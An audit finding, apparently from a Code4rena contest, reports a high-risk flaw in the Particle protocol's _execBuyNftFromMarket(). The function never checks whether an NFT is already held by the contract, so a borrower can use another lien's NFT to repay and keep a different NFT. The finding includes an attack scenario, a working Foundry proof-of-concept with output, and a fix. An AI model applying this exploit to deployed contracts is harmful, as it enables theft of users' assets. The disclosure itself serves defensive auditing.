## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- H-03

# [_execBuyNftFromMarket() Need to determine if NFT can't already be in the contract](https://github.com/code-423n4/2023-05-particle-findings/issues/15) 

# Lines of code

https://github.com/code-423n4/2023-05-particle/blob/1caf678bc20c24c96fc8f6b0046383ff0e9d2a6f/contracts/protocol/ParticleExchange.sol#L428


# Vulnerability details

## Impact
Use other Lien's NFTs for repayment

## Proof of Concept
`_execBuyNftFromMarket()` Whether the NFT is in the current contract after buy, to represent the successful buy of NFT

```solidity
    function _execBuyNftFromMarket(
        address collection,
        uint256 tokenId,
        uint256 amount,
        uint256 useToken,
        address marketplace,
        bytes calldata tradeData
    ) internal {
...

        if (IERC721(collection).ownerOf(tokenId) != address(this) || balanceBefore - address(this).balance != amount) {
            revert Errors.InvalidNFTBuy();
        }
    }    
```

But before executing the purchase, it does not determine whether the NFT is already in the contract

Since the current protocol does not limit an NFT to only one Lien, the `_execBuyNftFromMarket()` does not actually buy NFT, the funds is used to buy other NFTs but still can meet the verification conditions

Example.
1. alice transfer NFT_A to supply Lien[1]
2. bob performs `sellNftToMarket(1)` , and NFT_A is bought by jack
3. jack transfer NFT_A and supply Line[2] (after this NFT_A exists in the contract)
4. bob execute buyNftFromMarket(1), spend the same amount corresponding to the purchase of other NFT such as: tradeData = { buy NFT_K }
5. Step 4 can be passed `IERC721(collection).ownerOf(tokenId) ! = address(this) || balanceBefore - address(this).balance ! = amount`
and bob gets an additional NFT_K


Test code:

```solidity
    function testOneNftTwoLien() external {
        //0.lender supply lien[0]
        _approveAndSupply(lender,_tokenId);
        //1.borrower sell to market
        _rawSellToMarketplace(borrower, address(dummyMarketplace), 0, _sellAmount);
        //2.jack buy nft
        address jack = address(0x100);
        vm.startPrank(jack);
        dummyMarketplace.buyFromMarket(jack,address(dummyNFTs),_tokenId);
        vm.stopPrank();
        //3.jack  supply lien[1]
        _approveAndSupply(jack, _tokenId);        
        //4.borrower buyNftFromMarket , don't need buy dummyNFTs ,  buy other nft
        OtherDummyERC721 otherDummyERC721 = new OtherDummyERC721("otherNft","otherNft");
        otherDummyERC721.mint(address(dummyMarketplace),1);
        console.log("before borrower balance:",borrower.balance /  1 ether);
        console.log("before otherDummyERC721's owner is borrower :",otherDummyERC721.ownerOf(1)==borrower);
        bytes memory tradeData = abi.encodeWithSignature(
            "buyFromMarket(address,address,uint256)",
            borrower,
            address(otherDummyERC721),//<--------buy other nft
            1
        );
        vm.startPrank(borrower);
        particleExchange.buyNftFromMarket(
            _activeLien, 0, _tokenId, _sellAmount, 0, address(dummyMarketplace), tradeData);
        vm.stopPrank();
        //5.show borrower get 10 ether back , and get  other nft
        console.log("after borrower balance:",borrower.balance /  1 ether);
        console.log("after otherDummyERC721's owner is borrower :",otherDummyERC721.ownerOf(1)==borrower);

    }



contract OtherDummyERC721 is ERC721 {
    // solhint-disable-next-line no-empty-blocks
    constructor(string memory name, string memory symbol) ERC721(name, symbol) {}

    function mint(address to, uint256 tokenId) external {
        _safeMint(to, tokenId);
    }
}

```

```console

$ forge test --match testOneNftTwoLien  -vvv

[PASS] testOneNftTwoLien() (gas: 1466296)
Logs:
  before borrower balance: 0
  before otherDummyERC721's owner is borrower : false
  after borrower balance: 10
  after otherDummyERC721's owner is borrower : true

Test result: ok. 1 passed; 0 failed; finished in 6.44ms
```

## Tools Used

## Recommended Mitigation Steps
`_execBuyNftFromMarket` to determine the ownerOf() is not equal to the contract address before buying

```solidity
    function _execBuyNftFromMarket(
        address collection,
        uint256 tokenId,
        uint256 amount,
        uint256 useToken,
        address marketplace,
        bytes calldata tradeData
    ) internal {
        if (!registeredMarketplaces[marketplace]) {
            revert Errors.UnregisteredMarketplace();
        }
+       require(IERC721(collection).ownerOf(tokenId) != address(this),"NFT is already in contract ")
...
```


## Assessed type

Context